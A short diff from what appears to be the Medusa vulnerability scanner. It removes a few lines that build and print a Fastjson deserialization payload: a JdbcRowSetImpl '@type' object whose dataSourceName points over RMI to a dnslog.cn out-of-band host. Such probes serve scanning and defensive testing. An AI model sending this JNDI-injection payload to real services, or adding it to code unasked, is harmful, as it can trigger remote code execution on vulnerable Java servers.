@@ -11,14 +11,3 @@
 #         t.setDaemon(True)
 #         t.start()
 # medusa("","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36")
-import json
-DL="asdadasd.d.g25amv.dnslog.cn"
-data={
-    "b":{
-        "@type":"com.sun.rowset.JdbcRowSetImpl",
-        "dataSourceName":"rmi://"+DL+"//Exploit",
-        "autoCommit":True
-    }
-}
-data = json.dumps(data)
-print(data)
